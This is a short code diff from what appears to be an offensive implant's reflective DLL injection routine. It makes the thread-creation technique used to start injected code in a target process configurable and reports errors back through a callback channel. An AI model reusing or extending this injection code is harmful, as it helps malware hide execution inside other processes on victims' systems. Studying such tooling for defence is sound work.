@@ -277,7 +277,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
                 ctx->Parameter = MemParamsBuffer;
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
 
-                if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess, x64, ReflectiveLdr, MemParamsBuffer, NULL ) )
+                if ( ! ThreadCreate( ( BYTE ) ctx->Technique, hTargetProcess, x64, ReflectiveLdr, MemParamsBuffer, NULL ) )
                 {
                     PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
